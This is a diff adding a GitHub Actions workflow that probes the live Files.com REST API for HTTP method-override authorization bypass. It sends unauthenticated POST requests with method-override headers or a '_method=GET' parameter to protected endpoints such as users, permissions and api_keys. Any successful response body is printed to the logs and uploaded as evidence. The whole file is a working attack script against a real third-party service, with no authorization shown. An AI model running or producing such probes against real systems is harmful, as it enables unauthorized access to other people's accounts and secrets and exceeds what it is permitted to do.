@@ -1,0 +1,86 @@
+name: Files.com API Method Confusion Probe
+
+on:
+  push:
+    paths:
+      - ".github/workflows/files-api-method-confusion.yml"
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 4
+    steps:
+      - uses: actions/checkout@v4
+      - name: Test protected REST method confusion variants
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          base="https://app.files.com/api/rest/v1"
+          endpoints=(
+            "users.json"
+            "permissions.json"
+            "api_keys.json"
+            "workspaces.json"
+            "public_keys.json"
+            "custom_domains.json"
+            "event_targets.json"
+            "user_lifecycle_rules.json"
+            "history.json"
+            "sso_events.json"
+          )
+
+          : > method-confusion-results.jsonl
+          candidate=0
+
+          for endpoint in "${endpoints[@]}"; do
+            for variant in override_get override_head query_method; do
+              case "$variant" in
+                override_get)
+                  status=$(curl -sS --max-redirs 0 --connect-timeout 7 --max-time 12                     -X POST -H "X-HTTP-Method-Override: GET"                     -H "Accept: application/json"                     -H "Content-Type: application/json"                     -d '{}' -o /tmp/mc-body -w "%{http_code}"                     "$base/$endpoint" || true)
+                  ;;
+                override_head)
+                  status=$(curl -sS --max-redirs 0 --connect-timeout 7 --max-time 12                     -X POST -H "X-HTTP-Method-Override: HEAD"                     -H "Accept: application/json"                     -H "Content-Type: application/json"                     -d '{}' -o /tmp/mc-body -w "%{http_code}"                     "$base/$endpoint" || true)
+                  ;;
+                query_method)
+                  status=$(curl -sS --max-redirs 0 --connect-timeout 7 --max-time 12                     -X POST -H "Accept: application/json"                     -H "Content-Type: application/json"                     -d '{}' -o /tmp/mc-body -w "%{http_code}"                     "$base/$endpoint?_method=GET" || true)
+                  ;;
+              esac
+
+              bytes=$(wc -c < /tmp/mc-body 2>/dev/null || printf '0')
+              sha=$(sha256sum /tmp/mc-body 2>/dev/null | cut -d' ' -f1 || true)
+
+              printf '{"endpoint":"%s","variant":"%s","status":%s,"bytes":%s,"sha256":"%s"}\n'                 "$endpoint" "$variant" "$status" "$bytes" "$sha" | tee -a method-confusion-results.jsonl
+
+              if [ "$variant" != "override_head" ] && [ "$status" -ge 200 ] && [ "$status" -lt 300 ] && [ "$bytes" -gt 0 ]; then
+                echo "METHOD_CONFUSION_CANDIDATE endpoint=$endpoint variant=$variant"
+                head -c 1500 /tmp/mc-body || true
+                candidate=1
+                break 2
+              fi
+
+              rm -f /tmp/mc-body
+              sleep 0.5
+            done
+          done
+
+          if [ "$candidate" -eq 1 ]; then
+            echo "candidate=true" > method-confusion-summary.txt
+            exit 42
+          fi
+
+          echo "candidate=false" > method-confusion-summary.txt
+          echo "NO_METHOD_CONFUSION_AUTHORIZATION_BYPASS"
+
+      - name: Upload method-confusion evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: files-api-method-confusion-evidence
+          path: |
+            method-confusion-results.jsonl
+            method-confusion-summary.txt
